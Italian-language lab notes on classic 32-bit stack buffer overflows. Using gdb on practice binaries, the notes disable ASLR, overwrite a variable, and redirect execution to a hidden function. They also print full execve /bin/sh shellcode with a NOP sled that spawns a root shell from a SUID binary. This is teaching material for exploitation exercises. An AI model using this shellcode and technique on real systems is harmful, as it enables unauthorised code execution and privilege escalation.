---------27/3----------
) Scaricare lo zip presente nella descrizione dell'esercitazione
) Estrarlo come indicato
) sudo -i; echo 0 > /proc/sys/kernel/randomize_va_space
) installare gdb con un "apt update & upt upgrade" e poi "apt install gdb"
) se apt non funziona, modificare il file "/etc/apt/sources.list" sostituendo "kali.download" a "www.kali.org" 
) in alternativa a gdb, si potrebbe usare "objdump" -> objdump -D --disassembler-options="intel" es | less
) preparare una finestra di calcolatrice python lanciando "python"

L'idea generale di ogni esercizio è:
- guardare il sorgene (file .c nelle cartelle oppure slides)
- confrontare con il disassebled (d'ora in avanti chiamato dis.)
- comprendere cosa mandare nel buffer di ingresso per far stampare la flag di "successo"

Preliminariamente, creiamo un file ~/.gdbinit e inseriamo la riga "set disassembly-flavor intel"
In alternativa, questa riga può essere specificata ogni qual volta si avvia gdb una volta dentro la schermata gdb.


ESERCIZIO 1 - SCRITTURA DENTRO VARIABILE - CARTELLA "/lab_exercises/write_var"

Obbiettivo: scrivere un particolare valore nella variabile "uint32_t control" per far stampare la flag

- apriamo il file con gdb: "gdb es"
- "disas main" per vedere la funzione main o "disas vuln" per vedere la funzione vuln
- prima di poter procedere, dobbiamo collocare il processo in memoria. Per farlo lanciamo "run"
- se facciamo nuovamente "disas main" vediamo che gli indirizzi in blu sulla sinistra di ogni riga sono cambiati

Torniamo a osservare la funzione vuln:
- circa nella riga <+39> vediamo la chiamata della funzione "strcpy". Prima di ogni funzione, vengono effettuate le push degli argomenti.
- possiamo quindi dedurre che i due push in riga <+38> e <+32> siano le istruzioni di aggangio di argomenti
- conseguentemente, le posizioni cui si trovano gli argomenti sono "eax" (<+38>) ed "ebp+0x8" (<+32>).
- "ebp+0x8" è la posizione in cui si trova la variabile "src" cioè il 2ndo argomento di strcpy
- "eax" è la posizione in cui si trova la variabile "buf" cioè il 1mo argomento di strcpy
  Ma quanto vale "eax"? Vedendo l'istruzione <+35> notiamo che vale "ebp-0x78"
- risalendo ulteriormente nel codice, si vede alle riga <+22> l'assegnazione di una variabile all'indirizzo
  di memoria "epb-0x10". Questa variabile è "uint32_t control" (d'ora in avanti detto "control"). Questa
  viene settata al valore "12345".

Volendo fare qualche calcolo:
- il nostro buffer deve riempire completamente lo spazio assegnatogli e sforare nelle celle di "control
- convertendo con python "0x78" otteniamo il decimale "120" 
- convertendo con python "0x10" otteniamo il decimale "16"
- 120-16 = 104 -> servono "solo" 104 caratteri per sforare nella zona in cui è memorizzato "control"

Facciamo una prova:
- torniamo brevemente al dis. di vuln e teniamo a mente l'indrizzo di memoria dell'istruzione "strcpy"
- 0x565561f0
- lanciamo "b * 0x565561f0" per mettere un breakpoint a quell'istruzione
- proviamo a lanciare "run AAAAAAAAAAAAAAAAAAAAAAAAAAAA" -> y quando lo chiede -> si ferma al breakpoint
- le varie A sono il mio buffer. In particolare, python ci dice che ord("A")=65 ed hex(65)=0x41
- capiremo dunque che siamo davanti alla nostra sfilza di A quando vedremo celle piene di 4141414141
- vediamo cosa c'è in epb usando "x/150xw $epb". In particolare 150 è il quantità, w il cosa (words) ed x il formato (hex).
- stiamo quindi leggendo le prime 150 parole esadecimali di epb. -> qui le A non ci sono...
- proviamo a vedere l'indirizzo del buffer: "x/10xw $ebp-0x78" -> nemmeno qui ci sono
- questo perché il breakpoint è scattato PRIMA della strcpy, pertanto non è ancora avvenuta la copia
- lanciando "ni" si esegue la riga successiva
- ricontrolliamo: "x/10xw $ebp-0x78" -> i 414141 sono comparsi!
- se ci spostiamo ad osservare la variabile control: "x/10xw $ebp-0x10" vediamo che il registro vale 0x00003039
- come la calcolatrice di python conferma, questo valore è 12345. Non abbiamo quindi sforato. Servono più A!
- Questo è quanto ci aspettiamo, dato che abbiamo calcolato servano 104 "A" per sforare

Secondo tentativo:
- run $(python3 -c 'print("A"*104 + "BBBB")')
- "x/10xw $ebp-0x10" per controllare cosa c'è in control
- vediamo i 42424242 cioè le BBBB! Abbiamo sfortato con successo

Tornando a esaminare source e dis. di vuln
- notiamo che vi è un "if" che corrisponde alla riga <+75>
- viene valutato se il valore di control sia "42434445" ovvero "BCDE"
- teniamo a mente che in memoria, i dati sono salvati in Little Endian. Pertanto, il valore che rende l'if
  vero e stampa la flag è in realtà "EDCB"
  
Tentativo finale
- run $(python3 -c 'print("A"*104 + "EDCB")')
- ni
- "x/10xw $ebp-0x10" ci permette di vedere che effettivamente in control vi è BCDE
- "cont" per far proseguire il codice. Vediamo che termina stampando la flag.

ESERCIZIO 2 - FUNZIONI NASCOSTE - CARTELLA "/lab_exercises/secret_function"

Obbiettivo: si vuol fare eseguire la funzione secret per far stampare la flag

- gdb es
- run per posizionare correttamente in memoria

Osserviamo il disass di main:
- in riga <+62> viene fatta la strcpy. Individuiamo gli argomenti
- primo argomento: "edx", come si vede in <+59> -> vale "epb-0x1c" da quanto in linea <+56>
- secondo argomento: "edx" con il valore precedente, come si vede in <+55>
	questo vale "edx" per quanto in linea <+50>
	questo vale "edx+0x4" per quanto in linea <+47>
	questo vale "edx+0x4" per quanto in linea <+44>
	questo vale "ecx" per quanto in linea <+28>
	questo vale "esp+0x4" per quanto in linea <+7> -> si tratta di ciò che gli passo come arg
	
- si noti che, l'istruzione in linea <+39> apparentemente opera su "edx" ma si tratta di un compare.
  Questo confronta che "edx" sia <= 1 e, se sì salta alla riga <+70>
	
  Rifacendosi al sorgente, riga <+70> è riga 34 dove viene.
  
Per eseguire la funzione nascosta dobbimo agire sul jump in riga "<+42>", passandole l'indirizzo della funzione "secret"
- recuperiamo l'indirzzo delal funzione secret con "info functions secret"
- dovrebbe essere circa 0x565561b9
- dove è contenuto l'indirizzo a cui fare il jump? -> guardiamo il move che si eseguirebbe una volta saltati
- in riga <+70> si vede "ebp-0xc"

Con qualche calcolo vediamo che:
- buffer è contenuto in "ebp-0x1c" -> 0x1c = 28
- l'area di memoria con l'indirzzo di jump è "ebp-0xc" -> 0xc = 12
- 28-12 = 16
- servono 16 caratteri per sforare

Facciamo un tentativo
- run $(perl -e 'print "A" x16, "\xb9\x61\x55\x56"')
- "\xb9\x61\x55\x56" è l'inversione dell'indirizzo dove è secret, visto prima da "info functions secret"

- lanciando il run si vede che otteniamo la flag. Abbiamo quindi sforato e sovrascritto l'indirizzo della
  jump ad un indirizzo di nostro piacimento (quello di secret)




ESERCIZIO 3 - SUBSHELL - CARTELLA "/lab_exercises/subshell"

Per comprendere le dimensioni del buffer, si potrebbe fare a tentoni modificando le quantità di A. Facciamo un tentativo:
run $(perl -e 'print "A" x120, "BBBB"') -> "segmentation fault" 0x41414141 in ?? -> l'indirizzo fisico è pieno di di 41 (cioè A) -> ci sono troppe A, noi vorremmo vedere le B
run $(perl -e 'print "A" x115, "BBBB"') -> "segmentation fault" 0x42414141 in ?? -> ci siamo quasi, vediamo infatti la prima B
run $(perl -e 'print "A" x112, "BBBB"') -> "segmentation fault" 0x42424242 in ?? -> ecco, solo B. 112 è il numero di A corretto e la lunghezza del nostro buffer.

E se volessimo iniettare un comando? -> ve n'è uno nel file "shellcode.txt" caduto dal cielo che invoca la funzione malevola

Inseriamola nei 112 byte a disposizione. Come si vede, la stringa malevola non è lunga 112, ma solo 46. Quindi il nostro buffer deve diventare: 66NOP + 46FUNZ + 4RET = 112

Ed il RET? Non lo conosciamo. Troviamolo:
- brekpoint in riga +28
- "run AAAA" come prova -> ci serve vedere a che indirizzo fisico inizia il buffer
- "ni" per mettere le A nello stack -> fare un "x/10x $ebp-0x6c" e recuperare l'indrizzo fisico dove iniziano le A
- In questo caso, l'indirizzo è "0xffffcdcc".
- L'indirizzo "0xffffcdcc" diventa "\xcc\xcd\xff\xff"
- Lanciare il comandone presente nelle slide con l'indirizzo di RET appena individuato:
run $(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68","\xcc\xcd\xff\xff"')
- come si vede, il programma "malevolo" lancia /bin/usr/dash



ESERCIZIO 4 - SUBSHELL SU SHELL NORMALE 

Se si tenta di utilizzare lo stesso payload dell'esercizio 4 su una qualsiasi shell, questo non funziona. Il motivo sono le diverse variabili d'ambiente settate da gdb. Occorre lanciare il processo su una normale shell ed
interagirvi con gdb per recuperare il valore dell'indirizzo di return. 

Supponiamo che il file "es" abbia i permessi di root: "chmod u+s es"

- lanciamo il comando sottostante, che lancia il file, mettendo il processo (suspended) in background, e ci restituisce il pid del processo:
./es "$(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68","\xcc\xcd\xff\xff"')" & kill -STOP $!
- supponendo il pid sia 8888, agganciamo gdb al processo con "gdb --pid=8888"
- lanciamo un "ni" e dovremmo vedere il "received STOP"
- in un altra shell, lanciamo "kill -CONT 8888" che fa riprendere il programma
- tornando a gdb, un altro "ni" ci mostra il "received CONT"
- ci troviamo ora in uno spazio a 64 bit (come si vede dagli indirizzi hex lunghi). Lanciamo diverse volte il "finish" finché non si giungie allo spazio 32 bit, segnalato da:
	"cannot insert breakpoint 0. cannot access memory at address 0x55555558e5ce"
	
	) non è sempre detto che si arrivi nello spazio a 64 bit, dipende da quanto sia grande il payload e da quando viene ricevuto il segnale. In caso ci si trovi già nello spazio a 32, le finish non sono necessarie
- lanciamo "disas vuln" per vedere il codice
- inseriamo un breakpoint nell'indirizzo della strcpy -> sembra non funzionare, lanciamo "cont"
- il breakpoint è stato correttamente inserito se vediamo "breakpoint ... in vuln()"
- lanciamo "x/10x $ebp-0x6c" con il  solo scopo di avere l'indirizzo fisico a cui il buffer inizia
- supponiamo che l'indirizzo recuperato sia 0xffffce4c
- invertiamolo (solo l'ordine, le coppie di cifre sono uguali) in \x4c\xce\xff\xff
- terminamo il processo con "cont", che dovrebbe andare in errore
- spostiamoci su un'altra shell, lanciando lo stesso comando precedente ma con il nuovo indirizzo:
./es "$(perl -e 'print "\x90"x66,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68","\x4c\xce\xff\xff"')"
- dovrebbe essersi aperta una schermata di shell
- lanciando "whoami" si ottiene "root" -> se il SUID del file es NON è settato, whoami restituisce "kali"
